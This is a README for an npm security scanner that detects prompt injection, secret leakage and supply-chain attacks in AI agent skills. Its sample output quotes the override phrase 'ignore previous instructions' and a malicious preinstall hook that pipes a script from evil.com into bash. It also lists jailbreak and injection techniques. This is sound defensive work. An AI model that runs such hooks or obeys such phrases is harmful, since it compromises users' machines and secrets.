# 🛡️ OpenClaw Watch

**AI Agent Security & Observability Platform**

[![npm version](https://img.shields.io/npm/v/openclaw-watch)](https://www.npmjs.com/package/openclaw-watch)
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Zero Dependencies](https://img.shields.io/badge/dependencies-0-brightgreen)]()
[![Node.js >= 18](https://img.shields.io/badge/node-%3E%3D18-green)]()

> **150+ security patterns** across 8 rule categories. Zero native dependencies. SARIF output for GitHub Code Scanning. CLI skill scanner. Real-time monitoring hooks. Built for OpenClaw, works with any AI agent framework.

---

## 🔥 Why This Exists

AI agents have access to your files, tools, shell, and secrets. A single prompt injection can:

- **Exfiltrate your API keys** via tool calls
- **Overwrite SOUL.md** to hijack the agent's personality
- **Register shadow MCP servers** to intercept tool calls
- **Install backdoored skills** with obfuscated reverse shells

OpenClaw has 300k+ stars and 7700+ open issues. Security is the #1 community concern.

**OpenClaw Watch catches these attacks before they execute.**

---

## ⚡ Quick Start

```bash
# Scan a skill directory for threats
npx openclaw-watch scan ./skills/

# Scan with strict mode (exit code 1 on high/critical findings)
npx openclaw-watch scan ./skills/ --strict

# Output SARIF for GitHub Code Scanning
npx openclaw-watch scan . --format sarif > results.sarif

# JSON output for CI pipelines
npx openclaw-watch scan . --format json
```

### Example Output

```
🛡️  OpenClaw Watch — Security Scan Results
══════════════════════════════════════════════════
📁 Files scanned: 42
🔍 Findings: 7

📊 Summary:
   🔴 critical: 2
   🟠 high: 3
   🟡 warning: 2

📋 Findings:
──────────────────────────────────────────────────
🔴 [CRITICAL] prompt-injection
   📄 skills/evil-skill/SKILL.md:15
   📝 Direct instruction override attempt
   🔎 ignore previous instructions

🔴 [CRITICAL] supply-chain
   📄 skills/evil-skill/package.json:8
   📝 Suspicious npm lifecycle script with network command
   🔎 "preinstall": "curl https://evil.com/payload.sh | bash"
```

---

## 🏗️ Architecture

```
┌─────────────────────────────────────────────────┐
│                 OpenClaw Watch                   │
├──────────┬──────────┬──────────┬────────────────┤
│  CLI     │  Hooks   │ Scanner  │   Dashboard    │
│  scan    │  real-   │  skill   │   :19790       │
│  audit   │  time    │  files   │                │
├──────────┴──────────┴──────────┴────────────────┤
│              Security Engine                     │
│  ┌──────────────────────────────────────────┐   │
│  │  8 Rule Categories — 150+ Patterns       │   │
│  │  • Prompt Injection (60+)                │   │
│  │  • Data Leakage (45+)                    │   │
│  │  • Identity Protection                   │   │
│  │  • MCP Security                          │   │
│  │  • Supply Chain                          │   │
│  │  • File Protection                       │   │
│  │  • Anomaly Detection                     │   │
│  │  • Compliance                            │   │
│  └──────────────────────────────────────────┘   │
├─────────────────────────────────────────────────┤
│  Exporters: JSONL · Syslog/CEF · Webhook · SARIF│
└─────────────────────────────────────────────────┘
```

---

## 📊 Competitive Comparison

| Feature | **OpenClaw Watch** | ClawMoat | guard-scanner |
|---|---|---|---|
| Total patterns | **150+** | 30+ | 358 |
| Prompt injection patterns | **60+** (10 categories) | ~15 | ~50 |
| Multi-language injection | **12 languages** | ❌ | English only |
| Identity protection | **✅** SOUL.md/MEMORY.md | ❌ | ❌ |
| MCP security | **✅** SSRF/shadowing | ❌ | ❌ |
| Supply chain scanning | **✅** reverse shells, typosquat | ❌ | Partial |
| Skill/file scanner CLI | **✅** | ❌ | ✅ |
| SARIF output | **✅** GitHub Code Scanning | ❌ | ❌ |
| Real-time hooks | **✅** | ✅ | ❌ |
| Cost monitoring | **✅** | ❌ | ❌ |
| Tamper-proof audit log | **✅** SHA-256 chain | ❌ | ❌ |
| Dashboard | **✅** built-in | ❌ | ❌ |
| OWASP mapping | **✅** LLM Top 10 + Agentic AI | Partial | ❌ |
| Native dependencies | **0** | 3 | 12 |

---

## 🗂️ Rule Categories

### OWASP Agentic AI Mapping

| Rule | OWASP Category | Patterns | Severity Range |
|---|---|---|---|
| `prompt-injection` | LLM01: Prompt Injection | 60+ | warning → critical |
| `data-leakage` | LLM06: Sensitive Information Disclosure | 45+ | info → critical |
| `identity-protection` | Agentic AI: Identity Hijacking | 20+ | warning → critical |
| `mcp-security` | Agentic AI: Tool Manipulation | 25+ | warning → critical |
| `supply-chain` | Agentic AI: Supply Chain | 25+ | warning → critical |
| `file-protection` | LLM07: Insecure Plugin Design | 10+ | warning → critical |
| `anomaly-detection` | LLM04: Model Denial of Service | 5+ | warning → high |
| `compliance` | LLM09: Overreliance | 5+ | info → warning |

### Prompt Injection — 10 Sub-Categories

1. **Direct instruction override** — "ignore previous instructions"
2. **Role confusion / jailbreaks** — DAN, developer mode, base model
3. **Delimiter attacks** — `<|im_start|>`, `[INST]`, `<<SYS>>`
4. **Invisible Unicode** — zero-width chars, directional overrides, PUA
5. **Multi-language** — CN/JP/KR/AR/FR/DE/IT/RU injection phrases
6. **Encoding evasion** — Base64, hex, URL-encoded, HTML entities
7. **Indirect / embedded** — HTML comments, template injection, tool output cascading
8. **Multi-turn manipulation** — false memories, fake agreements
9. **Payload cascading** — template injection, string interpolation
10. **Context window stuffing** — oversized messages, repetitive padding

---

## 🔧 Installation

```bash
npm install openclaw-watch
```

### As a CLI tool

```bash
npm install -g openclaw-watch
openclaw-watch scan ./my-skills/
```

### In your OpenClaw hooks

```typescript
import { runSecurityScan } from 'openclaw-watch/security-engine';
import { builtinRules } from 'openclaw-watch/rules';

// Scan inbound messages
const findings = runSecurityScan(message.content, 'inbound', context);
if (findings.some(f => f.severity === 'critical')) {
  // Block the message
}
```

---

## 📤 SARIF Integration

Generate SARIF 2.1.0 for GitHub Code Scanning:

```bash
openclaw-watch scan . --format sarif > openclaw-watch.sarif
```

Use in GitHub Actions:

```yaml
- name: Security Scan
  run: npx openclaw-watch scan . --format sarif > results.sarif

- name: Upload SARIF
  uses: github/codeql-action/upload-sarif@v3
  with:
    sarif_file: results.sarif
```

---

## 🤝 Contributing

We welcome contributions! Key areas:

- **New detection patterns** — especially multi-language and encoding evasion
- **False positive reduction** — help us tune severity levels
- **New rule categories** — OAuth, webhook security, agent-to-agent trust
- **Integration guides** — for other AI agent frameworks

---

## 📜 License

MIT © [Kang Zhou](https://github.com/NeuZhou)

---

<p align="center">
  <b>OpenClaw Watch</b> — Because agents with shell access need a security guard. 🛡️
</p>
